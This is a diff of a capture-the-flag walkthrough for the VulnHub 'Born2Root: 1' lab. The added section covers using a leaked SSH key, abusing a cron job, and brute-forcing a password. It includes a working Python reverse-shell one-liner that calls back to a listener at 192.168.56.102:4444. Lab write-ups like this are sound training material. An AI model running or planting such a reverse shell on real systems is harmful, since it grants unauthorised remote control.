@@ -1,4 +1,4 @@
-# Born2Root
+# Born2Root: 1
 
 ## 1.Get VM IP
 
@@ -28,7 +28,9 @@ we found several directories, first go to `/icons` and there are a lot of files 
 
 ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2501949e-23dc-4baa-888c-6ee000056202)
 
-check the file named `VDSoyuAXiO.txt` and you see a SSH private key here :
+## 3.Gaining Shell
+
+Check the file named `VDSoyuAXiO.txt` and you see a SSH private key here :
 
 ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/5fc3cea2-3a53-49fe-91eb-95976e128380)
 
@@ -36,12 +38,33 @@ we can now check which user does this private key belongs to, i try user `martin
 
 ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/726b9871-be30-4f9e-ac46-ab00b27ca1a4)
 
-and for secret password just use a blank password
+and for secret password just use a blank password.
 
+## 4.Privilege Escalation 1 (Jimmy)
 
+Check crontab :
 
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/83620935-2f64-4113-9402-c0c9016a627d)
 
+the file `sekurity.py` has jimmy permissions and there are no `sekurity.py` in `/tmp` so we need to create one
 
+and put a reverse shell in it :
+
+```python
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+```
+
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/57fb2b39-c6cc-4e35-b08f-bcdce6e93eac)
+
+## 5.Privilege Escalation 2 (root)
+
+If you see the home page of user jimmy, there is a file called `networker` and when execurting it :
+
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/a01a92d0-0cdf-4713-a188-6a77a97788f8)
+
+this binary is a rabbit hole and has nothing to do with it, since we logged in as 2 users out of 3 possible users
+
+now the only option is to brute force the last user password, user `hadi`, we can generate a new wordlist 
 
 
 
